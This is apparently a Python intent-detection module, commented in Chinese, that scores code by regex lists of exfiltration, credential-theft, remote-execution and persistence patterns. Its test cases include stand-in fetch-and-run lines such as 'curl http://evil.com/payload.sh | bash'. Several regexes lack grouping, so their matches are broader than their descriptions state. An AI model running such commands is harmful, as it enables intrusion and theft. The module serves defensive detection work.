#!/usr/bin/env python3
"""
意图检测器 - Intent-based Detection
基于行为上下文分析代码的真实意图，降低误报率

核心能力:
1. 区分恶意下载 vs 正常部署
2. 区分恶意执行 vs 正常运维
3. 区分恶意窃取 vs 正常配置读取
"""

import re
from typing import Dict, List, Tuple
from dataclasses import dataclass
from enum import Enum

class IntentType(Enum):
    """意图类型"""
    MALICIOUS = "malicious"      # 恶意意图
    SUSPICIOUS = "suspicious"    # 可疑意图
    BENIGN = "benign"           # 正常意图
    UNKNOWN = "unknown"         # 未知意图

@dataclass
class IntentAnalysis:
    """意图分析结果"""
    intent: IntentType
    confidence: float  # 0.0-1.0
    reasons: List[str]
    risk_score: float  # 0.0-10.0

class IntentDetector:
    """意图检测器"""
    
    def __init__(self):
        # 恶意意图特征
        self.malicious_patterns = {
            "data_exfil": [
                (r"curl.*attacker", "外传到攻击者服务器"),
                (r"curl.*collect|exfil|steal", "明确的外传意图"),
                (r"webhook.*discord|telegram", "使用即时通讯外传"),
            ],
            "credential_theft": [
                (r"id_rsa.*curl|wget", "SSH 密钥外传"),
                (r"AWS_.*POST|send", "AWS 凭证外传"),
                (r"password.*writeFile", "密码写入文件"),
            ],
            "remote_exec": [
                (r"curl.*evil\.com|malicious", "从恶意域名下载"),
                (r"wget.*payload|backdoor", "下载后门"),
                (r"bash.*-c.*curl|wget", "管道执行远程代码"),
            ],
            "persistence": [
                (r"systemd.*malicious|backdoor", "恶意持久化"),
                (r"crontab.*curl.*bash", "定时下载执行"),
            ],
        }
        
        # 良性意图特征
        self.benign_patterns = {
            "devops": [
                (r"curl.*github\.com", "从 GitHub 下载"),
                (r"wget.*release|download", "下载发布版本"),
                (r"pip install|npm install", "包管理器安装"),
                (r"docker pull|docker run", "Docker 操作"),
            ],
            "monitoring": [
                (r"logging\.|logger\.", "日志记录"),
                (r"metrics|prometheus|grafana", "监控指标"),
                (r"health.?check|status", "健康检查"),
            ],
            "config": [
                (r"json\.dump|yaml\.dump", "配置序列化"),
                (r"csv\.DictReader|pandas", "数据处理"),
                (r"requests\.get\(.*api\.", "API 调用"),
            ],
        }
    
    def analyze(self, code: str, yara_matches: List[str] = None) -> IntentAnalysis:
        """
        分析代码意图
        
        Args:
            code: 源代码
            yara_matches: YARA 规则匹配结果
        
        Returns:
            IntentAnalysis: 意图分析结果
        """
        reasons = []
        risk_score = 0.0
        
        # 1. 检查恶意意图
        malicious_count = 0
        for category, patterns in self.malicious_patterns.items():
            for pattern, description in patterns:
                if re.search(pattern, code, re.IGNORECASE):
                    malicious_count += 1
                    reasons.append(f"🔴 恶意意图：{description}")
                    risk_score += 2.0
        
        # 2. 检查良性意图
        benign_count = 0
        for category, patterns in self.benign_patterns.items():
            for pattern, description in patterns:
                if re.search(pattern, code, re.IGNORECASE):
                    benign_count += 1
                    reasons.append(f"🟢 良性意图：{description}")
                    risk_score -= 1.0
        
        # 3. 上下文分析
        risk_score += self._analyze_context(code)
        
        # 4. 综合判断
        if malicious_count > 0 and benign_count == 0:
            intent = IntentType.MALICIOUS
            confidence = min(0.5 + malicious_count * 0.15, 0.95)
        elif benign_count > malicious_count:
            intent = IntentType.BENIGN
            confidence = min(0.5 + (benign_count - malicious_count) * 0.1, 0.9)
        elif malicious_count > 0:
            intent = IntentType.SUSPICIOUS
            confidence = 0.6
        else:
            intent = IntentType.UNKNOWN
            confidence = 0.3
        
        # 归一化风险评分
        risk_score = max(0.0, min(10.0, risk_score))
        
        return IntentAnalysis(
            intent=intent,
            confidence=confidence,
            reasons=reasons,
            risk_score=risk_score
        )
    
    def _analyze_context(self, code: str) -> float:
        """上下文分析"""
        risk = 0.0
        
        # 检查是否有混淆/隐藏意图
        if re.search(r"base64\..*decode.*exec|eval", code):
            risk += 2.0  # 编码后执行
        if re.search(r"\\x[0-9a-f]{2}.*exec", code):
            risk += 2.0  # Hex 编码执行
        
        # 检查是否有错误处理（良性特征）
        if re.search(r"try:.*except|if.*exists", code):
            risk -= 0.5  # 有错误处理
        
        # 检查是否有日志（良性特征）
        if re.search(r"print\(|logging\.|logger\.", code):
            risk -= 0.3  # 有日志输出
        
        return risk


def detect_intent(code: str, yara_matches: List[str] = None) -> Dict:
    """
    便捷函数：检测代码意图
    
    Args:
        code: 源代码
        yara_matches: YARA 匹配结果
    
    Returns:
        分析结果字典
    """
    detector = IntentDetector()
    result = detector.analyze(code, yara_matches)
    
    return {
        "intent": result.intent.value,
        "confidence": result.confidence,
        "risk_score": result.risk_score,
        "reasons": result.reasons,
        "recommendation": _get_recommendation(result)
    }

def _get_recommendation(analysis: IntentAnalysis) -> str:
    """获取处理建议"""
    if analysis.intent == IntentType.MALICIOUS:
        return "🔴 建议：阻断并告警"
    elif analysis.intent == IntentType.SUSPICIOUS:
        return "🟡 建议：人工审核"
    elif analysis.intent == IntentType.BENIGN:
        return "🟢 建议：放行"
    else:
        return "⚪ 建议：进一步分析"


if __name__ == "__main__":
    # 测试示例
    test_cases = [
        # 恶意示例
        ("""
        curl -s http://evil.com/payload.sh | bash
        """, "MALICIOUS"),
        
        # 良性示例
        ("""
        import requests
        response = requests.get('https://api.github.com/repos')
        print(response.json())
        """, "BENIGN"),
        
        # 可疑示例
        ("""
        import os
        os.system('curl http://example.com/script.sh | bash')
        """, "SUSPICIOUS"),
    ]
    
    print("🧠 意图检测器测试")
    print("=" * 60)
    
    for code, expected in test_cases:
        result = detect_intent(code)
        print(f"\n预期：{expected}")
        print(f"结果：{result['intent']} (置信度：{result['confidence']:.2f})")
        print(f"风险评分：{result['risk_score']:.1f}/10")
        print(f"建议：{result['recommendation']}")
        for reason in result['reasons']:
            print(f"  - {reason}")
